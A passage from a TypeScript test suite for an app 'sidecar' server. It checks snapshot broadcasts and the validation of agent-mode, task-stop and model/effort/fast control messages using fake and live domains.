  ).toBeUndefined()

  const { socket, received } = makeSocket()
  server.addConnection(socket)
  expect(received.filter(f => f.kind === 'sessions.snapshot')).toHaveLength(0)
})

test('P4-6 title-rider — after a fresh session first turn, broadcasts a session-title frame', async () => {
  const controller = new AppSessionController({
    async *runTurn() {
      yield {
        type: 'assistant',
        message: {
          id: 'm1',
          role: 'assistant',
          content: [{ type: 'text', text: 'ok' }],
        },
        parent_tool_use_id: null,
        session_id: ENGINE_SESSION,
        uuid: '00000000-0000-4000-8000-00000000b001',
      } as never
    },
  })
  // Inject fake title deps so the seam is proven without a Haiku round-trip: the
  // server must run the generator after the turn and broadcast the frame.
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller,
    resumed: false,
    titleDeps: {
      generate: async () => 'Fix login button',
      hasExistingTitle: () => false,
      persist: () => {},
    },
    log: () => {},
  })
  servers.push(server)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({ type: 'app.submit', requestId: 'r1', prompt: 'fix the login button' }),
  )
  await waitFor(() => received.some(f => f.kind === 'session-title'))

  expect(received.find(f => f.kind === 'session-title')).toEqual({
    kind: 'session-title',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    title: 'Fix login button',
  })
})

test('T4 — rejects a submit whose goalSnapshot is not a valid ThreadGoal', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r1',
      prompt: 'hi',
      options: { goalSnapshot: { threadId: 42 /* wrong type */ } },
    }),
  )
  const err = received.find(f => f.kind === 'error' && f.message.includes('goalSnapshot'))
  expect(err).toBeDefined()
})

test('P4-10 — emits the live thread goal snapshot on attach and store change', () => {
  const store = makePermissionStore()
  store.setState(prev => ({
    ...prev,
    threadGoal: {
      threadId: 'thread-1',
      goalId: 'goal-1',
      objective: 'Ship goals panel',
      status: 'active',
      tokenBudget: 10_000,
      tokensUsed: 123,
      timeUsedSeconds: 7,
      createdAtMs: 1,
      updatedAtMs: 2,
    },
  }))
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    createSidecarGoalDomain(store),
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  const attachSnapshot = received.find(
    (frame): frame is Extract<ServerFrame, { kind: 'thread-goal.snapshot' }> =>
      frame.kind === 'thread-goal.snapshot',
  )
  expect(attachSnapshot?.kind).toBe('thread-goal.snapshot')
  expect(attachSnapshot?.goal?.objective).toBe('Ship goals panel')
  expect(attachSnapshot?.goal?.summary).toContain('Token budget: 10,000')

  store.setState(prev => ({
    ...prev,
    threadGoal: prev.threadGoal
      ? { ...prev.threadGoal, status: 'paused', updatedAtMs: 3 }
      : null,
  }))

  const latest = received
    .filter(
      (frame): frame is Extract<ServerFrame, { kind: 'thread-goal.snapshot' }> =>
        frame.kind === 'thread-goal.snapshot',
    )
    .at(-1)
  expect(latest?.kind).toBe('thread-goal.snapshot')
  expect(latest?.goal?.status).toBe('paused')
})

test('P4-12 — attach emits an extensions.snapshot after the goal snapshot, secretGuard-clean through send()', () => {
  const store = createStore(getDefaultAppState())
  const goals = createSidecarGoalDomain(store)
  // A snapshot carrying only config METADATA (the domain's secret posture) —
  // if a secret-KEYED field ever leaked in, send()'s secretGuard would drop the
  // whole frame, so its arrival is itself the proof.
  const extensions = createSidecarExtensionsDomain({
    mcp: [{ name: 'linear', transport: 'http', scope: 'user', url: 'https://mcp.linear/rpc' }],
    plugins: [],
    skills: [
      {
        name: 'deep-research',
        source: 'userSettings',
        context: 'inline',
        disableModelInvocation: false,
        userInvocable: true,
        description: 'research a topic',
      },
    ],
    hooks: [],
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    goals,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    extensions,
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  const readyIdx = received.findIndex(f => f.kind === 'ready')
  const goalIdx = received.findIndex(f => f.kind === 'thread-goal.snapshot')
  const extIdx = received.findIndex(f => f.kind === 'extensions.snapshot')
  // Attach order: ready → … → thread-goal.snapshot → … → extensions.snapshot.
  expect(readyIdx).toBe(0)
  expect(goalIdx).toBeGreaterThan(readyIdx)
  expect(extIdx).toBeGreaterThan(goalIdx)

  const snap = received.find(
    (frame): frame is Extract<ServerFrame, { kind: 'extensions.snapshot' }> =>
      frame.kind === 'extensions.snapshot',
  )
  expect(snap?.extensions.mcp?.[0]?.name).toBe('linear')
  expect(snap?.extensions.skills?.[0]?.name).toBe('deep-research')
  expect(snap && scanForSecrets(snap).ok).toBe(true)
})

test('P4-9 — emits the live tasks snapshot on attach and store change', () => {
  const store = makePermissionStore()
  const runningBash: LocalShellTaskState = {
    ...createTaskStateBase('b1', 'local_bash', 'echo hi'),
    type: 'local_bash',
    status: 'running',
    command: 'echo hi',
    completionStatusSentInAttachment: false,
    shellCommand: null,
    lastReportedTotalLines: 0,
    isBackgrounded: true,
  }
  store.setState(prev => ({ ...prev, tasks: { b1: runningBash } }))
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    createSidecarTasksDomain(store),
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  const attachSnapshot = received.find(
    (frame): frame is Extract<ServerFrame, { kind: 'tasks.snapshot' }> =>
      frame.kind === 'tasks.snapshot',
  )
  expect(attachSnapshot?.kind).toBe('tasks.snapshot')
  expect(attachSnapshot?.tasks.items).toHaveLength(1)
  expect(attachSnapshot?.tasks.items[0]).toMatchObject({
    id: 'b1',
    type: 'local_bash',
    status: 'running',
    label: 'echo hi',
  })

  store.setState(prev => ({
    ...prev,
    tasks: { b1: { ...runningBash, status: 'completed', isBackgrounded: true } },
  }))

  const latest = received
    .filter(
      (frame): frame is Extract<ServerFrame, { kind: 'tasks.snapshot' }> =>
        frame.kind === 'tasks.snapshot',
    )
    .at(-1)
  expect(latest?.kind).toBe('tasks.snapshot')
  // A completed local_bash task isn't the terminal-backgrounded-local_agent
  // carve-out, so it drops out of isVisibleBackgroundTask on the re-broadcast
  // — proving the store-driven re-emit carries fresh filtered state, not a
  // stale copy of the attach-time snapshot.
  expect(latest?.tasks.items).toHaveLength(0)
})

test('P4-8 — emits a joined agent-mode.snapshot on attach that is secretGuard-clean', async () => {
  const store = makePermissionStore()
  const blockedWorker = {
    ...createTaskStateBase('a1', 'local_agent', 'Wire the auth flow'),
    type: 'local_agent' as const,
    status: 'completed' as const,
    agentId: 'w-blocked',
    prompt: 'Wire the auth flow',
    agentType: 'implementor',
    agentName: 'Turing',
    retrieved: false,
    lastReportedToolCount: 0,
    lastReportedTokenCount: 0,
    isBackgrounded: true,
    pendingMessages: [],
    retain: false,
    diskLoaded: false,
    handoffStatus: 'blocked' as const,
    blockReason: 'Which auth strategy should I use?',
  }
  store.setState(prev => ({ ...prev, tasks: { a1: blockedWorker } }))
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    createSidecarAgentModeDomain(store),
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  // sendAgentModeSnapshot is async (the session plane is a file-backed engine
  // read), fired-and-forgotten on attach — poll for the emitted frame.
  const findFrame = () =>
    received.find(
      (frame): frame is Extract<ServerFrame, { kind: 'agent-mode.snapshot' }> =>
        frame.kind === 'agent-mode.snapshot',
    )
  for (let i = 0; i < 100 && !findFrame(); i += 1) {
    await new Promise(resolve => setTimeout(resolve, 10))
  }

  const snapshot = findFrame()
  expect(snapshot?.kind).toBe('agent-mode.snapshot')
  // Assert MY live worker is present rather than an exact count: `getSessionId()`
  // is a process global shared across tests in this harness, so the persisted
  // plane may add foreign continuity workers here (a real sidecar owns one
  // session, so this is a test-harness artifact, not a production shape).
  const liveWorker = snapshot?.agentMode.workers.find(worker => worker.agentId === 'w-blocked')
  expect(liveWorker).toMatchObject({
    handle: 'Turing',
    role: 'implementor',
    status: 'completed',
    handoffStatus: 'blocked',
    blockReason: 'Which auth strategy should I use?',
  })
  expect(snapshot && scanForSecrets(snapshot).ok).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * P4-8b — agent-mode SET verb (the in-session Orchestrator toggle) boundary
 * ------------------------------------------------------------------------- *
 * Exercises the SERVER boundary (checkStrictKeys + Zod schema + dispatch +
 * result frame + async snapshot re-broadcast) with a FAKE domain, so the engine
 * `matchSessionMode`/`process.env` round-trip is not touched here (that is proven
 * in agentModeDomain.test.ts).
 */
function fakeAgentModeDomain(
  override?: (active: boolean) => { ok: boolean; message: string; changed: boolean },
): { domain: SidecarAgentModeDomain; calls: boolean[] } {
  const calls: boolean[] = []
  let active = false
  const domain: SidecarAgentModeDomain = {
    async getSnapshot() {
      return { active, objective: '', phase: 'planning', workers: [] }
    },
    setActive(next: boolean) {
      calls.push(next)
      if (override) return override(next)
      const changed = next !== active
      active = next
      return { ok: true, message: next ? 'on' : 'off', changed }
    },
    subscribe() {
      return () => {}
    },
  }
  return { domain, calls }
}

function makeAgentModeServer(
  override?: (active: boolean) => { ok: boolean; message: string; changed: boolean },
): { server: SidecarServer; calls: boolean[] } {
  const { domain, calls } = fakeAgentModeDomain(override)
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    domain,
  )
  return { server, calls }
}

test('P4-8b — a valid agent-mode.set{active:true} switches the domain + re-broadcasts the snapshot', async () => {
  const { server, calls } = makeAgentModeServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  // Wait out the fire-and-forget attach snapshot so the re-broadcast is isolable.
  for (let i = 0; i < 50 && !received.some(f => f.kind === 'agent-mode.snapshot'); i += 1) {
    await new Promise(resolve => setTimeout(resolve, 10))
  }
  const before = received.filter(f => f.kind === 'agent-mode.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'agent-mode.set',
        requestId: 'am1',
        active: true,
      } as unknown as ClientFrame['message'],
    }),
  )

  // The result ack is synchronous.
  const result = received.find(f => f.kind === 'agent-mode.set.result')
  expect(result && result.kind === 'agent-mode.set.result' && result.ok).toBe(true)
  expect(result && result.kind === 'agent-mode.set.result' && result.requestId).toBe('am1')
  expect(calls).toEqual([true])

  // The snapshot re-broadcast is async (file-backed session-plane read) — poll.
  for (
    let i = 0;
    i < 50 && received.filter(f => f.kind === 'agent-mode.snapshot').length <= before;
    i += 1
  ) {
    await new Promise(resolve => setTimeout(resolve, 10))
  }
  const after = received.filter(
    (f): f is Extract<ServerFrame, { kind: 'agent-mode.snapshot' }> =>
      f.kind === 'agent-mode.snapshot',
  )
  expect(after.length).toBeGreaterThan(before)
  // The freshly re-broadcast snapshot reflects the flipped mode.
  expect(after[after.length - 1]?.agentMode.active).toBe(true)
})

test('P4-8b — an idempotent agent-mode.set (no change) acks ok but does NOT re-broadcast', async () => {
  const { server } = makeAgentModeServer(() => ({ ok: true, message: 'already off', changed: false }))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  for (let i = 0; i < 50 && !received.some(f => f.kind === 'agent-mode.snapshot'); i += 1) {
    await new Promise(resolve => setTimeout(resolve, 10))
  }
  const before = received.filter(f => f.kind === 'agent-mode.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'agent-mode.set', requestId: 'am2', active: false } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'agent-mode.set.result' && f.ok)).toBe(true)
  // Give any (unexpected) async broadcast a chance, then assert none fired.
  await new Promise(resolve => setTimeout(resolve, 30))
  expect(received.filter(f => f.kind === 'agent-mode.snapshot').length).toBe(before)
})

test('P4-8b — rejects agent-mode.set with a NON-boolean active (Zod boundary), no domain call', () => {
  const { server, calls } = makeAgentModeServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'agent-mode.set', requestId: 'am3', active: 'yes' } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'agent-mode.set.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-8b — rejects agent-mode.set missing requestId at the schema boundary, no domain call', () => {
  const { server, calls } = makeAgentModeServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'agent-mode.set', active: true } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'agent-mode.set.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-8b — rejects agent-mode.set carrying an unexpected key (checkStrictKeys), no domain call', () => {
  const { server, calls } = makeAgentModeServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      // A renderer-supplied extra key is rejected before the verb reaches the domain.
      message: { type: 'agent-mode.set', requestId: 'am4', active: true, sessionMode: 'coordinator' } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'agent-mode.set.result')).toBe(false)
  expect(calls).toEqual([])
})

/* ------------------------------------------------------------------------- *
 * P4-8b — task-control STOP verb (the deferred worker Stop/kill) boundary
 * ------------------------------------------------------------------------- *
 * Exercises the SERVER boundary (checkStrictKeys + Zod schema + dispatch + result
 * frame) with a FAKE domain, so the engine `stopTask` round-trip is not touched
 * here (that is proven live in taskControlDomain.test.ts). One live-path test wires
 * the REAL task-control + tasks domains over a shared store to prove a real stop
 * drives a fresh `tasks.snapshot`.
 */
function fakeTaskControlDomain(
  override?: (taskId: string) => { ok: boolean; message: string },
): { domain: SidecarTaskControlDomain; calls: string[] } {
  const calls: string[] = []
  const domain: SidecarTaskControlDomain = {
    async stop(taskId: string) {
      calls.push(taskId)
      return override ? override(taskId) : { ok: true, message: 'Stopped worker.' }
    },
  }
  return { domain, calls }
}

function makeTaskControlServer(
  override?: (taskId: string) => { ok: boolean; message: string },
): { server: SidecarServer; calls: string[] } {
  const { domain, calls } = fakeTaskControlDomain(override)
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined, // permissions
    undefined, // goals
    undefined, // accounts
    undefined, // workspaceTrust
    undefined, // diagnostics
    undefined, // remoteSettings
    undefined, // tasks
    undefined, // extensions
    undefined, // agentMode
    undefined, // settings
    undefined, // runControls
    undefined, // sessionActions
    domain, // taskControl
  )
  return { server, calls }
}

test('P4-8b — a valid task.stop dispatches the domain + acks task-control.result (echoes requestId)', async () => {
  const { server, calls } = makeTaskControlServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'task.stop',
        requestId: 'ts1',
        taskId: 'agent-1',
      } as unknown as ClientFrame['message'],
    }),
  )

  // The handler awaits the async domain, so poll for the result ack.
  for (let i = 0; i < 50 && !received.some(f => f.kind === 'task-control.result'); i += 1) {
    await new Promise(resolve => setTimeout(resolve, 5))
  }
  const result = received.find(f => f.kind === 'task-control.result')
  expect(result && result.kind === 'task-control.result' && result.ok).toBe(true)
  expect(result && result.kind === 'task-control.result' && result.verb).toBe('task.stop')
  expect(result && result.kind === 'task-control.result' && result.requestId).toBe('ts1')
  expect(calls).toEqual(['agent-1'])
})

test('P4-8b — an unknown/terminal task acks ok:false (fail-closed), no crash', async () => {
  const { server, calls } = makeTaskControlServer(() => ({
    ok: false,
    message: 'That task is no longer running.',
  }))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'task.stop', requestId: 'ts2', taskId: 'gone' } as unknown as ClientFrame['message'],
    }),
  )

  for (let i = 0; i < 50 && !received.some(f => f.kind === 'task-control.result'); i += 1) {
    await new Promise(resolve => setTimeout(resolve, 5))
  }
  const result = received.find(f => f.kind === 'task-control.result')
  expect(result && result.kind === 'task-control.result' && result.ok).toBe(false)
  expect(calls).toEqual(['gone'])
})

test('P4-8b — rejects task.stop with a NON-string taskId (Zod boundary), no domain call', () => {
  const { server, calls } = makeTaskControlServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'task.stop', requestId: 'ts3', taskId: 42 } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'task-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-8b — rejects task.stop missing requestId at the schema boundary, no domain call', () => {
  const { server, calls } = makeTaskControlServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'task.stop', taskId: 'agent-1' } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'task-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-8b — rejects task.stop carrying an unexpected key (checkStrictKeys), no domain call', () => {
  const { server, calls } = makeTaskControlServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      // A renderer-supplied extra key (e.g. a forged engine handle) is rejected
      // before the verb reaches the domain.
      message: { type: 'task.stop', requestId: 'ts4', taskId: 'agent-1', kill: true } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'task-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-8b — task.stop with NO task-control domain fails closed (internal_error), no result frame', () => {
  // A server without a taskControl domain — the verb routes but the domain is absent.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'task.stop', requestId: 'ts5', taskId: 'agent-1' } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
  expect(received.some(f => f.kind === 'task-control.result')).toBe(false)
})

test('P4-8b — LIVE PATH: a real task.stop kills the worker AND drives a fresh tasks.snapshot', async () => {
  const store = createStore(getDefaultAppState())
  const runningWorker = {
    ...createTaskStateBase('a1', 'local_agent', 'Wire the auth flow'),
    type: 'local_agent' as const,
    status: 'running' as const,
    agentId: 'agent-live',
    agentType: 'implementor',
    agentName: 'Turing',
    isBackgrounded: true,
    abortController: new AbortController(),
  }
  store.setState(prev => ({ ...prev, tasks: { a1: runningWorker } as never }))

  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined, // permissions
    undefined, // goals
    undefined, // accounts
    undefined, // workspaceTrust
    undefined, // diagnostics
    undefined, // remoteSettings
    createSidecarTasksDomain(store), // tasks — its store-subscription re-broadcasts
    undefined, // extensions
    undefined, // agentMode
    undefined, // settings
    undefined, // runControls
    undefined, // sessionActions
    createSidecarTaskControlDomain(store), // taskControl — REAL stopTask
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'tasks.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'task.stop', requestId: 'ts6', taskId: 'a1' } as unknown as ClientFrame['message'],
    }),
  )

  for (
    let i = 0;
    i < 50 &&
    (!received.some(f => f.kind === 'task-control.result') ||
      received.filter(f => f.kind === 'tasks.snapshot').length <= before);
    i += 1
  ) {
    await new Promise(resolve => setTimeout(resolve, 5))
  }

  const result = received.find(f => f.kind === 'task-control.result')
  expect(result && result.kind === 'task-control.result' && result.ok).toBe(true)
  // The REAL stopTask flipped the store — proven by the store, not a stub.
  expect(store.getState().tasks.a1?.status).toBe('killed')
  // The store mutation drove a fresh tasks.snapshot re-broadcast (NOT synthetic).
  const snaps = received.filter(
    (f): f is Extract<ServerFrame, { kind: 'tasks.snapshot' }> => f.kind === 'tasks.snapshot',
  )
  expect(snaps.length).toBeGreaterThan(before)
  const item = snaps[snaps.length - 1]?.tasks.items.find(i => i.id === 'a1')
  expect(item?.status).toBe('killed')
})

/* ------------------------------------------------------------------------- *
 * P4-24c — composer run-control SET verbs (Model / Reasoning / Fast) boundary
 * ------------------------------------------------------------------------- *
 * Exercises the SERVER boundary (checkStrictKeys + Zod schema + dispatch + result
 * frame + subscription-driven snapshot re-broadcast) with a FAKE domain whose set
 * mutates in-memory state AND fires its subscribe listener — so the re-broadcast
 * proven here is the REAL store-subscription path, not a synthetic action-driven
 * one. The engine setter round-trip is proven separately in runControlsDomain.test.ts.
 */
function fakeRunControlsDomain(): {
  domain: SidecarRunControlsDomain
  calls: string[]
} {
  const calls: string[] = []
  let model: string | null = 'claude-opus-4-6'
  let effort: string | null = null
  let fast = false
  let providerSwitchLocked = false
  let listener: (() => void) | null = null
  const snapshot = (): RunControlsSnapshot => ({
    model: {
      current: model,
      // The real builder resolves both from the engine (marketing name +
      // context window); this fake only has to keep them tied to `model` so a
      // frame-level test can see them move with it.
      currentLabel: model === null ? null : `Name for ${model}`,
      contextWindow: model === null ? null : 200_000,
      selected: model,
      provider: 'anthropic',
      providerSwitchLocked,
      options: [
        { value: null, label: 'Default', provider: 'anthropic' },
        { value: 'gpt-5.6-terra', label: 'GPT-5.6 Terra', provider: 'openai' },
        { value: 'claude-opus-4-6', label: 'Claude Opus 4.6', provider: 'anthropic' },
        { value: 'opus', label: 'Opus', provider: 'anthropic' },
      ],
    },
    effort: {
      current: effort,
      selected: effort,
      supported: true,
      options: ['low', 'medium', 'high'],
    },
    fast: { active: fast, supportedByModel: true, available: true, unavailableReason: null },
    // Tied to `model` like the two display facts above: the real builder resolves
    // these from the engine's own auto-compact functions.
    autoCompact: {
      enabled: true,
      threshold: model === null ? null : 181_000,
      warningThreshold: model === null ? null : 161_000,
    },
  })
  const domain: SidecarRunControlsDomain = {
    getSnapshot: snapshot,
    setModel(next) {
      if (!snapshot().model.options.some(option => option.value === next)) {
        return {
          ok: false,
          message: `Unsupported model: ${next}.`,
          changed: false,
        }
      }
      calls.push(`model:${next}`)
      const changed = next !== model
      model = next
      if (changed) listener?.()
      return { ok: true, message: `Model set to ${next}.`, changed }
    },
    setEffort(next) {
      if (next !== 'auto' && !snapshot().effort.options.includes(next)) {
        return {
          ok: false,
          message: `Unsupported effort: ${next}.`,
          changed: false,
        }
      }
      calls.push(`effort:${next}`)
      const value = next === 'auto' ? null : next
      const changed = value !== effort
      effort = value
      if (changed) listener?.()
      return { ok: true, message: `Effort set to ${next}.`, changed }
    },
    setFast(active) {
      calls.push(`fast:${active}`)
      const changed = active !== fast
      fast = active
      if (changed) listener?.()
      return { ok: true, message: active ? 'on' : 'off', changed }
    },
    activateProvider(provider) {
      return {
        ok: true,
        message: `Provider set to ${provider}.`,
        changed: true,
      }
    },
    lockProviderSwitches() {
      if (providerSwitchLocked) return false
      providerSwitchLocked = true
      listener?.()
      return true
    },
    subscribe(l) {
      listener = l
      return () => {
        listener = null
      }
    },
  }
  return { domain, calls }
}

function makeRunControlsServer(): {
  server: SidecarServer
  calls: string[]
} {
  const { domain, calls } = fakeRunControlsDomain()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    domain,
  )
  return { server, calls }
}

test('P4-24c — a valid model.set switches the model + re-broadcasts run-controls.snapshot (live path)', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'run-controls.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'model.set',
        requestId: 'rc1',
        model: 'gpt-5.6-terra',
      } as unknown as ClientFrame['message'],
    }),
  )

  // The result ack echoes the requestId.
  const result = received.find(f => f.kind === 'run-control.result')
  expect(result && result.kind === 'run-control.result' && result.ok).toBe(true)
  expect(result && result.kind === 'run-control.result' && result.verb).toBe('model.set')
  expect(result && result.kind === 'run-control.result' && result.requestId).toBe('rc1')
  expect(calls).toEqual(['model:gpt-5.6-terra'])

  // The store-subscription re-broadcast fired synchronously with the new model.
  const snaps = received.filter(
    (f): f is Extract<ServerFrame, { kind: 'run-controls.snapshot' }> =>
      f.kind === 'run-controls.snapshot',
  )
  expect(snaps.length).toBeGreaterThan(before)
  const latest = snaps[snaps.length - 1]?.runControls.model
  expect(latest?.current).toBe('gpt-5.6-terra')
  // The composer face and the context gauge read these two, and they are what
  // makes a model switch visible before any turn runs. The clone + secretGuard
  // + size cap on the outbound path must carry them, not drop them.
  expect(latest?.currentLabel).toBe('Name for gpt-5.6-terra')
  expect(latest?.contextWindow).toBe(200_000)
})

test('P4-24c — an idempotent set (no change) acks ok but does NOT re-broadcast', () => {
  const { server } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'run-controls.snapshot').length

  // The fake seeds model = 'claude-opus-4-6'; re-setting the same model is a no-op.
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'model.set',
        requestId: 'rc2',
        model: 'claude-opus-4-6',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'run-control.result' && f.ok)).toBe(true)
  expect(received.filter(f => f.kind === 'run-controls.snapshot').length).toBe(before)
})

test('P4-24c — model.set null restores provider-local Default through the strict boundary', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'model.set',
        requestId: 'rc-default',
        model: null,
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(calls).toEqual(['model:null'])
  expect(
    received.some(
      frame =>
        frame.kind === 'run-control.result' &&
        frame.requestId === 'rc-default' &&
        frame.ok,
    ),
  ).toBe(true)
})

test('P4-24c — an accepted first submit immediately locks and re-broadcasts provider switching', () => {
  const { server } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(
    frame => frame.kind === 'run-controls.snapshot',
  ).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'app.submit',
        requestId: 'first-turn',
        prompt: 'hello',
      },
    }),
  )

  const snapshots = received.filter(
    (frame): frame is Extract<ServerFrame, { kind: 'run-controls.snapshot' }> =>
      frame.kind === 'run-controls.snapshot',
  )
  expect(snapshots.length).toBeGreaterThan(before)
  expect(
    snapshots[snapshots.length - 1]?.runControls.model.providerSwitchLocked,
  ).toBe(true)
})

test('P4-24c — a valid effort.set + fast.set both round-trip through the domain', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'effort.set', requestId: 'rc3', effort: 'high' } as unknown as ClientFrame['message'],
    }),
  )
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'fast.set', requestId: 'rc4', active: true } as unknown as ClientFrame['message'],
    }),
  )

  expect(calls).toEqual(['effort:high', 'fast:true'])
  const snaps = received.filter(
    (f): f is Extract<ServerFrame, { kind: 'run-controls.snapshot' }> =>
      f.kind === 'run-controls.snapshot',
  )
  expect(snaps[snaps.length - 1]?.runControls.effort.current).toBe('high')
  expect(snaps[snaps.length - 1]?.runControls.fast.active).toBe(true)
})

test('P4-24c — a well-typed unsupported model returns a correlated failed result', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'model.set',
        requestId: 'rc-unsupported-model',
        model: 'forged-model',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(
      f =>
        f.kind === 'run-control.result' &&
        f.requestId === 'rc-unsupported-model' &&
        !f.ok,
    ),
  ).toBe(true)
  expect(calls).toEqual([])
})

test('P4-24c — a well-typed unsupported effort returns a correlated failed result', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
